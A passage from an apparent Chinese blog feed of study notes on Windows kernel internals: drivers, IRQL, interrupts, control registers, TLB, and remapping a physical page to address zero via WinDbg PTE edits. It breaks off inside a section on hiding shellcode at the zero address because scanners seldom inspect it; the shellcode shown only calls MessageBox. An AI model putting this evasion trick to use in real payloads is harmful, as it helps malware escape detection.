</p><p>创建、复制、比较以及转换等。它们的函数如下：</p><table><thead><tr><th align="center">ANSI_STRING</th><th align="center">UNICODE_STRING</th></tr></thead><tbody><tr><td align="center">RtlInitAnsiString</td><td align="center">RtlInitUnicodeString</td></tr><tr><td align="center">RtlCopyString</td><td align="center">RtlCopyUnicodeString</td></tr><tr><td align="center">RtlCompareString</td><td align="center">RtlCompareUnicodeString</td></tr><tr><td align="center">RtlAnsiStringToUnicodeString</td><td align="center">RtlUnicodeStringToAnsiString</td></tr></tbody></table><h2 id="驱动代码解析"><a href="#驱动代码解析" class="headerlink" title="驱动代码解析"></a>驱动代码解析</h2><p>还是拿最经典的 hello world 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h3><p><code>DriverEntry</code>是驱动程序的入口，如果驱动加载成功后，就像<code>Dll</code>加载成功调用<code>DllMain</code>函数一样，调用该函数。</p><p>但是，编译成功后可以发现，DriverEntry 跟 main 一样，并不是程序加载最先调用的，都是间接被调用的，而真正的入口是 FxDriverEntry。</p><img src="/2024/11/23/WindowsDriver0/1.png" class=""><p>并且该函数是被导出的。</p><p>DriverEntry 的第一个参数需要来解析一下，它的类型是 <code>PDRIVER_OBJECT</code>，熟悉 Windows SDK 命名的应该知道，它是一个指向 <code>DRIVER_OBJECT</code> 的指针。</p><p>驱动文件加载之后，驱动的所有信息通过这个结构体来返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以在驱动中加个断点，来查看这个对象</p><img src="/2024/11/23/WindowsDriver0/2.png" class=""><p>这里逐步分析该结构体的各个字段意义</p><ul><li>Type：类型</li><li>Size：结构体大小</li><li>DeviceObject：设备对象</li><li>Flags：标志位</li><li>DriverStart：驱动对象加载后的起始地址</li><li>DriverSize：驱动对象加载后的内存大小</li><li>DriverSection：它是一个存储目前所有已加载的驱动程序信息相关的<code>LDR_DATA_TABLE_ENTRY</code>结构体的双向循环链表。</li><li>DriverName：驱动名</li><li>DriverUnload：驱动对象的卸载地址，如果存在则会调用它</li></ul><p>其余就不一一写出了。</p><h2 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h2><p><code>IRQL</code>全称<code>Interrupt Request Level</code>，即<strong>中断请求等级</strong>。它是<code>Windows</code>自己定义的一套优先级方案，与<code>CPU</code>无关，数值越大权限越高。中断包括了硬中断和软中断，硬中断是由硬件产生，而软中断则是完全虚拟出来的。处理器在一个<code>IRQL</code>上执行线程代码，每个处理器的<code>IRQL</code>决定了它如何处理中断，以及允许接收哪些中断。在同一处理器上，线程只能被更高级别<code>IRQL</code>的线程能中断。每个处理器都有自己的中断<code>IRQL</code>。</p><img src="/2024/11/23/WindowsDriver0/3.png" class=""><p>常见的<code>IRQL</code>级别有四个：<code>Passive</code>、<code>APC</code>、<code>Dispatch</code>、<code>DIRQL</code>。<code>PASSIVE_LEVEL</code>是最低级别，没有被屏蔽的中断，线程执行用户模式，可以访问分页内存。</p><p><code>APC_LEVEL</code>只有<code>APC</code>级别的中断被屏蔽，可以访问分页内存。当有<code>APC</code>发生时，处理器提升到<code>APC</code>级别，就屏蔽掉其它<code>APC</code>。</p><p><code>DISPATCH_LEVEL</code>可以屏蔽<code>DPC</code>(延迟过程) 和更低的中断，不能访问分页内存。</p><h2 id="关于分页内存和非分页内存"><a href="#关于分页内存和非分页内存" class="headerlink" title="关于分页内存和非分页内存"></a>关于分页内存和非分页内存</h2><p>上面提到，中断等级在 <code>DISPATCH_LEVEL</code> 及以上时无法访问分页内存。因为分页内存会被换到外存，如果想要加载到内存中会触发一个缺页中断，将该页重新加载进内存，该例程运行在 <code>DISPATCH_LEVEL</code> 的中断等级下。而这个所谓的中断是不允许同级打断的，因此在 <code>DISPATCH_LEVEL</code> 下访问分页内存会导致访问内存的线程一直尝试等待物理页被写入内存，而触发的中断又无法直接打断该例程，就有可能直接造成蓝屏。</p><p>而根据看雪某帖子下面的评论描述，访问分页内存的时候会同时判断 IRQL 和物理页的 valid 位，当 <code>IRQL &gt; APC_LEVEL</code> 且物理页 <code>valid=0</code> 时，直接蓝屏。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15491543.html">https://www.cnblogs.com/wingsummer/p/15491543.html</a></li><li>[2]：<a href="https://bbs.kanxue.com/thread-160200.htm">https://bbs.kanxue.com/thread-160200.htm</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下Windows驱动开发基础</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（6）——中断与异常和控制寄存器</title>
    <link href="https://xia0ji233.github.io/2024/11/22/WindowsKernel6/"/>
    <id>https://xia0ji233.github.io/2024/11/22/WindowsKernel6/</id>
    <published>2024-11-22T07:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.494Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下X86中断与异常和控制寄存器</p><span id="more"></span><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断通常是由<code>CPU</code>外部的输入输出设备（硬件）所触发的，供外部设备通知<code>CPU</code>有事情需要处理，因此又叫中断请求，英文为<code>Interrupt Request</code>。中断请求的目的是希望<code>CPU</code>暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程，中断处理程序由 IDT 表决定。</p><p><code>80x86</code> 有两条中断请求线：非屏蔽中断线，<code>NMI</code>，全称<code>NonMaskable Interrupt</code>和可屏蔽中断线，<code>INTR</code>，全称<code>Interrupt Require</code>。</p><h3 id="可屏蔽中断"><a href="#可屏蔽中断" class="headerlink" title="可屏蔽中断"></a>可屏蔽中断</h3><p>CPU 的 EFLAGS 有一个 IF 位，它表示了 CPU 当前是否接受可屏蔽中断请求，下面是 EFLAGS 寄存器的图解</p><img src="/2024/11/22/WindowsKernel6/1.png" class=""><p>IF 是第九位，权值为 0x200，这也就是为什么在用户态我们看到的 EFLAGS 值几乎都是 2xx，因为用户态几乎不允许把该位复位，复位该位需要特权指令 cli 来操作，而重新设置指令需要 sti 来操作。</p><p>IF &#x3D; 1 的时候，可屏蔽中断请求可以被执行，IF &#x3D; 0 的时候，可屏蔽中断会被屏蔽，不会被执行，不可屏蔽中断走的是 CPU 的NMI引脚，而可屏蔽中断走的就是INTR引脚。</p><p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求.为了便于标识各个中断请求，中断管理器通常用<code>IRQ</code>，全称为<code>Interrupt Request</code>，后面加上数字来表示不同的中断，例如在键盘设备中，可以看到键盘的请求是一号中断</p><img src="/2024/11/22/WindowsKernel6/2.png" class=""><h3 id="不可屏蔽中断"><a href="#不可屏蔽中断" class="headerlink" title="不可屏蔽中断"></a>不可屏蔽中断</h3><p>不赘述了，就是 CPU 收到就必须立刻执行的事件，诸如CPU掉电，总线校验错误，内存校验错误，看门狗错误等，一旦发生了这些事件，硬件会向 CPU 的 NMI 引脚发送一个中断请求要求 CPU 立刻响应。不过大部分的 NMI 可能都表示着CPU生存周期的终结（出现的故障无法恢复），当然也有一些软件产生的 NMI 中断，可能在执行完事件处理程序之后，会允许 CPU 继续运行。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常通常是<code>CPU</code>在执行指令时检测到的某些错误，比如除0、访问无效页等。也可以看出，异常是 CPU 主动触发的，是在检测到一些指令不符合某些要求的时候触发的。而中断是由外部设备（中断源）向CPU请求的，是被动的。<code>int n</code> 虽然这个指令是中断（<strong>Interrupt</strong>）的缩写，但是它本质还是 CPU 主动触发了一个异常，就跟除法的时候检测到了被除数为零是差不多的。</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>无论是由硬件设备触发的中断请求还是由<code>CPU</code>产生的异常，处理程序都在<code>IDT</code>表。常见的异常处理程序如下表所示：</p><table><thead><tr><th align="center">错误类型</th><th align="center">（IDT表）中断号</th></tr></thead><tbody><tr><td align="center">页错误</td><td align="center">0xE</td></tr><tr><td align="center">段错误</td><td align="center">0xD</td></tr><tr><td align="center">除零错误</td><td align="center">0x0</td></tr><tr><td align="center">双重错误</td><td align="center">0x8</td></tr></tbody></table><h4 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h4><p>这是 CPU 主动触发的比较多的异常，当<code>PDE/PTE</code> 的 <code>P=0</code> 时或当<code>PDE/PTE</code>的属性为只读但程序试图写入的时就会触发。一旦发生缺页异常，<code>CPU</code>会执行<code>IDT</code>表中的<code>0xE</code>中断处理程序，由操作系统来接管。</p><p>在 Windows 操作系统中，大家都听过 pagefile.sys，它占用空间很大并且无时无刻不被写入，以前问过一个很蠢的问题就是，这个文件是否能删？先来了解一下这个文件是干啥的，答：为了节省物理内存。由于程序局部性的原理，一个程序所占用的物理页，很可能只有一小部分的数据会被频繁读写或者执行，大部分数据可能都不会反复被使用，那么对于这样一部分的物理页，操作系统会选择将该物理页保存到外部文件，也就是这个 pagefile.sys，也就是这个物理页不会被挂上去了。但是当再一次需要使用的时候怎么办呢，此时找不到对应的物理页，CPU 报告一个缺页异常，调用 IDT 表的 0xE 中断程序去处理，发现这个虚拟内存事实上是有对应的物理内存，只是现在被交换到外部文件当中，那就重新指定一个物理页，把内容写回重新挂上，向CPU报告“这个虚拟内存已经被正确挂上了物理页，可以访问了”，那么CPU重新执行这条指令之后就不会报错了就接着运行。</p><p>可以说，缺页异常在操作系统中是无时无刻不在发生。就连刚申请的内存页，在不访问之前也是不会挂物理页的（即不实际占用内存），在第一次访问的时候会引发缺页异常，发现这个页是正确的，只是没被挂物理页，那么挂上物理页之后重新执行再返回。</p><h2 id="控制寄存器介绍"><a href="#控制寄存器介绍" class="headerlink" title="控制寄存器介绍"></a>控制寄存器介绍</h2><p>控制寄存器（CR0、CR2、CR3、CR4）中有一些标志和数据域用于控制系统级操作，另外一些标志则专用来支持操作系统和管理程序，其中，CR1作保留目前不使用。</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>CR0寄存器中含有控制处理器操作模式和状态的系统控制标志，可以说它是总开关的集合体。如下图所示：</p><img src="/2024/11/22/WindowsKernel6/3.png" class=""><p>这里解释几个重要的位</p><ul><li><code>PE</code>位是启用保护模式（Protection Enable）标志。若<code>PE = 1</code>是开启保护模式，反之为实地址模式。这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么<code>PE</code>和<code>PG</code>标志都要置位。</li><li><code>PG</code>位是启用分页机制。在开启这个标志之前必须已经或者同时开启<code>PE</code>标志。<code>PG = 0</code>且<code>PE = 0</code>，处理器工作在实地址模式下。<code>PG = 0</code>且<code>PE = 1</code>，处理器工作在没有开启分页机制的保护模式下。<code>PG = 1</code>且<code>PE = 0</code>，在<code>PE</code>没有开启的情况下无法开启<code>PG</code>。<code>PG = 1</code>且<code>PE = 1</code>，处理器       工作在开启了分页机制的保护模式下。</li><li><code>WP</code>位对于<code>Intel 80486</code>或以上的<code>CPU</code>，是写保护（Write Proctect）标志。当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作；当<code>CPL &lt; 3</code>的时候，如果<code>WP = 0</code>可以读写任意用户级物理页，只要线性地址有效。如果<code>WP = 1</code>可以读取任意用户级物理页，但对于只读的物理页，则不能写。</li></ul><h3 id="CR1"><a href="#CR1" class="headerlink" title="CR1"></a>CR1</h3><p>保留，暂不使用</p><h3 id="CR2"><a href="#CR2" class="headerlink" title="CR2"></a>CR2</h3><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中。</p><h3 id="CR3"><a href="#CR3" class="headerlink" title="CR3"></a>CR3</h3><p>CR3含有存放页目录表页的物理地址，因此CR3也被称为PDBR（Page-Directory Base address Register，页目录基地址寄存器）。因此前面提到的，dirbase 就是 CR3 的值，事实上任务的切换也依赖于 CR3 寄存器。</p><h3 id="CR4"><a href="#CR4" class="headerlink" title="CR4"></a>CR4</h3><p><code>Cr4</code>的结构如下图所示：</p><img src="/2024/11/22/WindowsKernel6/4.png" class=""><p><code>VME</code>用于虚拟8086模式。<code>PAE</code>用于确认是哪个分页，<code>PAE = 1</code>，是<code>2-9-9-12</code>分页，<code>PAE = 0</code>是<code>10-10-12</code>分页。<code>PSE</code>是大页是否开启的总开关，如果置0，就算<code>PDE</code>中设置了大页你也得是普通的页。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364650.html">https://www.cnblogs.com/wingsummer/p/15364650.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_7/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_7&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下X86中断与异常和控制寄存器</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（5）——TLB</title>
    <link href="https://xia0ji233.github.io/2024/11/11/WindowsKernel5/"/>
    <id>https://xia0ji233.github.io/2024/11/11/WindowsKernel5/</id>
    <published>2024-11-11T14:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.493Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下TLB的一些细节</p><span id="more"></span><h2 id="TLB简介"><a href="#TLB简介" class="headerlink" title="TLB简介"></a>TLB简介</h2><p>TLB（Translation Lookaside Buffer，转换后援缓冲器），是一个硬件单元，它用于保存每个进程虚拟地址到物理地址的映射，这里做的对进程的区分大概是使用 CR3 区分的，这个点看很多文章都没有提到，但是仅仅保存线性地址到物理地址的映射是必然不够的，因为不同的进程的同一线性地址不一定对应相同的物理页，但是猜测大概是这样的。</p><p>TLB 做了指令和数据的区分，ITLB专门存放指令页（可执行页），DTLB专门存放数据页（不可执行）</p><p>而根据大页与小页的区别，又可分为大页 TLB 和小页 TLB。将线性地址右移一定位数（页内偏移的位数，小页12，2-9-9-12大页为 21，10-10-12 大页为 22）</p><p>这里就可以分为四种了。</p><ol><li>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；</li><li>第三组：缓存大尺寸页表（2M&#x2F;4M字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第四组：缓存大尺寸页表（2M&#x2F;4M字节页面）的数据页表缓存（Data-TLB）</li></ol><p>TLB 的结构可以视为一张表格</p><table><thead><tr><th>虚拟页帧</th><th>物理页帧</th><th>属性</th><th>命中次数</th></tr></thead><tbody><tr><td>0x1234</td><td>0x1010</td><td>r-x</td><td>5</td></tr><tr><td>0x1111</td><td>0x1000</td><td>r-x</td><td>3</td></tr></tbody></table><p>上表为例，假设是 ITLB，小页，那么这里有两个条目，分别是：</p><ul><li>线性地址 0x1234000 对应了物理地址 0x1010000。</li><li>线性地址 0x111000 对应了物理地址 0x1000000。</li></ul><p>这里的属性不一定只有读写属性，可能还有一系列的其它属性。</p><p>这里有以下注意的点</p><ol><li>不同的CPU，TLB大小不同。</li><li>只要 CR3 发生变化，TLB立即刷新，一核一套TLB。</li><li>G位只对大页 PDE 和 PTE 有效，当 G 位为 1 时，刷新 TLB 将不会刷新 PTE。</li><li>G位为1的页，当TLB写满时，根据命中次数的字段计算访问频率，将最近一段时间内未被访问的条目驱逐。</li></ol><h2 id="TLB探测"><a href="#TLB探测" class="headerlink" title="TLB探测"></a>TLB探测</h2><p>其实很简单，尝试分配两个页，一个写 a，一个写 b，先将 a 的物理页挂到 0 地址，读取；再将 b 的物理页挂到 0 地址，再次读取，如果读取得到的值一样，就证明了缓存是存在的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下TLB的一些细节</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（4）——挂物理页</title>
    <link href="https://xia0ji233.github.io/2024/11/10/WindowsKernel4/"/>
    <id>https://xia0ji233.github.io/2024/11/10/WindowsKernel4/</id>
    <published>2024-11-10T13:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.493Z</updated>
    
    <content type="html"><![CDATA[<p>挂物理页的一些细节</p><span id="more"></span><h2 id="线性地址有效性判断"><a href="#线性地址有效性判断" class="headerlink" title="线性地址有效性判断"></a>线性地址有效性判断</h2><p>之前我们分析过 <code>MmIsValidAddress</code> 函数，在 10-10-12 分页模式下就是去拿到页表的线性地址，然后判断 PTE 和 PDE 的P位是否都有效。一般来说，如果都有效说明进程在这个线性地址这里挂上了物理页。</p><h2 id="零地址挂页"><a href="#零地址挂页" class="headerlink" title="零地址挂页"></a>零地址挂页</h2><p>考虑以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">*x=<span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>通常情况下我们会认为这两条语句执行之后必然出错，这就是所谓的空指针错误，但是空指针真的不能写值吗？未必，只是通常情况下不会在上面挂物理页，而对一个线性地址的内存进行读或写操作都会校验这个线性地址是否有效，如果无效则会抛出异常 crash 程序。</p><p>以 10-10-12 分页为例，写出以下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(addr,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">    *x=<span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,*x);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等待第一次分配输出地址</p><img src="/2024/11/10/WindowsKernel4/1.png" class=""><p>计算 PDI，PTI 的时候不要偷懒 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000000101100000000000000000</span><br><span class="line">0000000000</span><br><span class="line">0</span><br><span class="line">0101100000</span><br><span class="line">0x160</span><br><span class="line">000000000000</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意上面的代码中加入了 memset，这是因为线性地址只有第一次读&#x2F;写的时候会挂物理页，如果只申请没有读写则不会挂物理页。</p><img src="/2024/11/10/WindowsKernel4/2.png" class=""><p>我们尝试把这个页挂在零地址上，这里查看一下 PDI 为 0 的物理地址，如上图所示的值为 0x5a1eb000，这个物理地址必然没有被挂上物理页，我们把刚刚那个页的PTE写到线性地址 0 上。</p><p>使用 windbg 命令 <code>!ed 0x5a1eb000 2b13a847</code>。</p><img src="/2024/11/10/WindowsKernel4/3.png" class=""><p>现在 0 地址挂上了物理页，我们再看看能否继续运行。</p><img src="/2024/11/10/WindowsKernel4/4.png" class=""><p>发现没有问题，完美运行通过，而如果此时去读刚刚 addr 分配的线性地址就会发现，值同样也是 0x12345678，而对应的物理页肯定也是这个值，这里对代码稍作修改再次输出。</p><img src="/2024/11/10/WindowsKernel4/5.png" class=""><p>这点也论证了同一个物理页是可以被挂上不同的线性地址，这里展示的是同一个进程不同的线性地址。而不同进程的线性地址同样也能挂同一个物理页，也就是所谓的共享内存（一个进程修改，另一个进程会得到修改的结果）。</p><h2 id="零地址写shellcode"><a href="#零地址写shellcode" class="headerlink" title="零地址写shellcode"></a>零地址写shellcode</h2><p>Windows 的 shellcode，通常情况下，shellcode 藏在 0 线性地址是比较有效的，因为大部分扫描器通常不会去动 0 这一片的地址，而挂页的时候，是否可执行是通过 PTE 决定的。也就是说，同样的一个物理页，你可以以只读形式挂在 0x400000 这样的一个线性地址，同时还可以以读写的形式挂在 0 地址，这是可行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*funcptr)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    BYTE shellcode[]=&#123;</span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,xxx</span></span><br><span class="line">        <span class="number">0xFF</span>,<span class="number">0xD0</span>, <span class="comment">//call eax</span></span><br><span class="line">        <span class="number">0xC3</span>, <span class="comment">//ret</span></span><br><span class="line">    &#125;;</span><br><span class="line">    *(DWORD *)(&amp;shellcode[<span class="number">9</span>])=(DWORD)MessageBox;</span><br><span class="line">    <span class="built_in">memcpy</span>(addr,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span 